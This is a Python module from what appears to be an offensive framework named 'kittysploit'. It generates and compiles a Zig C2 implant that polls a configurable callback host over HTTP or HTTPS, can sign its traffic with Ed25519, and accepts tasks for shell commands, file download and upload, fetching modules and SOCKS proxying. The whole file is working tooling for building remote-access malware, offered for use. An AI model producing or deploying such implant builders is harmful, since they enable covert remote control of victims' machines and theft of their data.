#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Shared Zig Kitty HTTP polling payload base."""

from __future__ import annotations

from pathlib import Path

from six import with_metaclass

from kittysploit import *
from core.framework.base_module import ModuleOptionsAggregator
from lib.c2.zig_kitty_agent import build_zig_kitty_http_source


def _ed25519_seed_hex_from_pem(private_key_pem: str) -> str:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import ed25519

    key = serialization.load_pem_private_key(private_key_pem.encode(), password=None)
    if not isinstance(key, ed25519.Ed25519PrivateKey):
        return ""
    raw = key.private_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PrivateFormat.Raw,
        encryption_algorithm=serialization.NoEncryption(),
    )
    return raw.hex()


class ZigKittyHttpPollingBase(with_metaclass(ModuleOptionsAggregator, object)):
    """Generate + optionally compile a Zig Kitty HTTP polling implant.

    Uses ModuleOptionsAggregator so Opt* attributes are visible to ``set`` /
    ``show options`` when mixed into a Payload Module.
    """

    PRESTAGE_SUPPORTED = True
    CLIENT_LANGUAGE = "zig"

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(8088, "Callback port", True)
    url_prefix = OptString("/c2", "URL prefix (must match listener)", False, True)
    client_id = OptString("zigkitty1", "Client/implant ID (overridden by implant_identity)", False, True)
    poll_interval = OptInteger(10, "Base poll interval seconds", False, True)
    user_agent = OptString("Mozilla/5.0", "HTTP User-Agent", False, True)
    target_arch = OptChoice(
        "x86_64",
        "Target architecture",
        True,
        choices=["x86_64", "x86", "aarch64"],
    )
    optimization = OptChoice(
        "ReleaseSmall",
        "Optimization level",
        False,
        choices=["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    auto_compile = OptBool(True, "Compile binary after generation", False)
    output_dir = OptString("output", "Output directory for compiled binary", False)
    use_ssl = OptBool(False, "HTTPS callback (listener must enable SSL)", False, True)

    def _target_os(self) -> str:
        return "linux"

    def _binary_name(self) -> str:
        return "kitty_agent"

    def _windows_subsystem(self):
        return None

    def generate(self):
        identity = None
        try:
            identity = self._apply_implant_identity_options()
        except Exception:
            identity = None

        client_id = str(
            getattr(getattr(self, "client_id", None), "value", self.client_id) or ""
        ).strip() or "zigkitty1"
        seed_hex = ""
        if identity is not None:
            client_id = identity.implant_id
            seed_hex = _ed25519_seed_hex_from_pem(identity.private_key_pem)

        zig_code = build_zig_kitty_http_source(
            str(self.lhost),
            int(self.lport),
            client_id,
            url_prefix=str(self.url_prefix or "/c2"),
            poll_interval=int(self.poll_interval or 10),
            user_agent=str(self.user_agent or "Mozilla/5.0"),
            ed25519_seed_hex=seed_hex,
            use_ssl=bool(getattr(getattr(self, "use_ssl", None), "value", self.use_ssl)),
        )
        if hasattr(self, "_apply_prestage_to_script"):
            zig_code = self._apply_prestage_to_script(zig_code)

        output_path = Path(self.output_dir) if self.output_dir else Path("output")
        output_path = output_path.resolve()
        output_path.mkdir(parents=True, exist_ok=True)

        src_file = output_path / "zig_kitty_http_polling.zig"
        try:
            src_file.write_text(zig_code, encoding="utf-8")
            print_success(f"Source saved: {src_file}")
        except Exception as exc:
            print_warning(f"Could not write source file: {exc}")

        if identity is not None:
            pem_path = output_path / f"implant_{client_id}_public.pem"
            try:
                pem_path.write_text(identity.public_key_pem, encoding="utf-8")
                print_success(f"Public key saved: {pem_path}")
                print_info(
                    "On listener: set implant_public_key to this PEM (or paste contents)"
                )
            except Exception as exc:
                print_warning(f"Could not write public key: {exc}")

        target_os = self._target_os()
        bin_name = self._binary_name()
        if target_os == "windows" and not bin_name.endswith(".exe"):
            bin_name = f"{bin_name}.exe"
        binary_path = output_path / bin_name

        print_status("Generating Zig Kitty HTTP polling implant...")
        print_info(f"Target: {self.target_arch}-{target_os}")
        print_info(f"Callback: {'https' if bool(getattr(getattr(self, 'use_ssl', None), 'value', self.use_ssl)) else 'http'}://{self.lhost}:{self.lport}{self.url_prefix}")
        print_info(f"Client ID: {client_id}")
        if seed_hex:
            print_info("Ed25519 signing: enabled (query sig= on poll/result)")
        else:
            print_info("Ed25519 signing: disabled (set implant_identity=true to enable)")
        print_info("Tasks: shell/ls/pwd/whoami/cat/download/upload/fetch_module/socks_start/socks_stop/exit")
        print_info("Listener: listeners/multi/reverse_http_polling")

        if not self.auto_compile:
            print_info(f"Auto-compile disabled. Source: {src_file}")
            return bytes(f"zig_kitty_http_polling source: {src_file}", encoding="utf-8")

        ok = self.compile_zig(
            source_code=zig_code,
            output_path=str(binary_path.resolve()),
            target_platform=target_os,
            target_arch=str(self.target_arch),
            optimization=str(self.optimization),
            strip=True,
            static=True,
            windows_subsystem=self._windows_subsystem(),
        )

        if ok and binary_path.exists():
            size = binary_path.stat().st_size
            print_success(f"Binary compiled: {binary_path} ({size} bytes)")
            return bytes(f"zig_kitty_http_polling binary: {binary_path}", encoding="utf-8")

        print_warning("Compilation failed. Check Zig is available.")
        return bytes(f"zig_kitty_http_polling source: {src_file}", encoding="utf-8")
